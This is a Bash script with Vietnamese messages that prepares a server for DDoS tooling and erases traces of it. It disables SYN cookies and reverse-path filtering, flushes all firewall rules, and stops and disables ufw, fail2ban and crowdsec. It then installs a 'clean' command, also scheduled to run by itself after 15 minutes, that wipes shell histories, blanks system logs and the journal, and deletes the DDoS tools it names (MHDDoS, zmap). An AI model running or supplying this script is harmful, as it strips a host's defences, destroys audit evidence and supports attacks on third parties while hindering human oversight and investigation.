#!/bin/bash


echo -e "Xóa dấu vết và bypass"

echo "[+] Bật chế độ bypass"
sysctl -w net.core.rmem_max=134217728 &>/dev/null
sysctl -w net.core.wmem_max=134217728 &>/dev/null
sysctl -w net.ipv4.tcp_mem="134217728 134217728 134217728" &>/dev/null
sysctl -w net.ipv4.tcp_rmem="4096 87380 134217728" &>/dev/null
sysctl -w net.ipv4.tcp_wmem="4096 65536 134217728" &>/dev/null
sysctl -w net.core.netdev_max_backlog=50000 &>/dev/null
sysctl -w net.core.somaxconn=65535 &>/dev/null
sysctl -w net.ipv4.tcp_max_syn_backlog=65536 &>/dev/null
sysctl -w net.ipv4.tcp_syncookies=0 &>/dev/null
sysctl -w net.ipv4.tcp_timestamps=0 &>/dev/null
sysctl -w net.ipv4.conf.all.rp_filter=0 &>/dev/null
sysctl -w net.ipv4.conf.default.rp_filter=0 &>/dev/null
sysctl -w net.ipv4.conf.all.accept_source_route=1 &>/dev/null
sysctl -w fs.file-max=2097152 &>/dev/null
ulimit -n 999999 2>/dev/null
echo "* soft nofile 999999" >> /etc/security/limits.conf
echo "* hard nofile 999999" >> /etc/security/limits.conf

iptables -F && iptables -X && iptables -t nat -F && iptables -t mangle -F
iptables -P INPUT ACCEPT && iptables -P FORWARD ACCEPT && iptables -P OUTPUT ACCEPT
nft flush ruleset &>/dev/null
systemctl stop ufw fail2ban crowdsec &>/dev/null
systemctl disable ufw fail2ban crowdsec &>/dev/null

clean() {
    echo "[!] Đang dọn dấu vết 100%..."
    history -c; echo "" > /root/.bash_history
    for u in $(cut -d: -f1 /etc/passwd); do echo "" > /home/$u/.bash_history 2>/dev/null; done
    find / -name "*.log" -exec echo "" > {} \; 2>/dev/null
    echo "" > /var/log/auth.log > /var/log/syslog > /var/log/kern.log > /var/log/messages > /var/log/wtmp > /var/log/btmp > /var/log/lastlog
    rm -rf /root/zmap* /root/MHDDoS /root/archer* /tmp/* /var/tmp/* 2>/dev/null
    conntrack -F &>/dev/null; ip neigh flush all &>/dev/null
    iptables -Z -t filter; iptables -Z -t nat; iptables -Z -t mangle; iptables -Z -t raw
    journalctl --rotate --vacuum-time=1s &>/dev/null
    echo "[+] Đã sạch hoàn toàn - không tìm thấy gì!"
}

# Tự động dọn sau 15 phút nếu không tắt
(sleep 900 && clean) &

echo "clean" > /usr/bin/clean && chmod +x /usr/bin/clean
cat > /usr/bin/clean <<'EOF'
#!/bin/bash
$(declare -f clean)
clean
EOF
chmod +x /usr/bin/clean

echo -e "\033[1;36m[+] Gõ 'clean' bất kỳ lúc nào để xóa sạch dấu vết ngay lập tức!\033[0m"
echo -e "\033[1;31m    Server sẽ tự động sạch sau 15 phút nữa.\033[0m\n"
